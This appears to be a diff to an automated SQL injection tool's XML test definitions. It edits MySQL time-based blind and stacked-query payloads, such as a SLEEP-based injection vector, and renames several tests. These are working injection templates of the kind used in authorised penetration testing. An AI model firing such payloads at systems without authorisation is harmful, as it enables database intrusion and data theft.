@@ -1650,7 +1650,7 @@ Tag: <test>
         <where>1</where>
         <vector>; (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
         <request>
-            <payload>AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+            <payload>; (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
         </request>
         <response>
             <time>[SLEEPTIME]</time>
@@ -1663,7 +1663,7 @@ Tag: <test>
 
     <test>
         <title>MySQL &gt; 5.0.11 stacked queries (SELECT - comment)</title>
-        <stype>5</stype>
+        <stype>4</stype>
         <level>4</level>
         <risk>0</risk>
         <clause>0</clause>
@@ -2929,7 +2929,7 @@ Tag: <test>
 
     <!-- Time-based blind tests - Parameter replace -->
     <test>
-        <title>MySQL &gt; 5.0.11 AND time-based blind (SELECT)</title>
+        <title>MySQL &gt; 5.0.11 time-based blind - Parameter replace (SELECT)</title>
         <stype>5</stype>
         <level>4</level>
         <risk>1</risk>
@@ -2949,7 +2949,7 @@ Tag: <test>
     </test>
 
     <test>
-        <title>MySQL &gt; 5.0.11 AND time-based blind (SELECT - comment)</title>
+        <title>MySQL &gt; 5.0.11 time-based blind - Parameter replace (SELECT - comment)</title>
         <stype>5</stype>
         <level>5</level>
         <risk>1</risk>
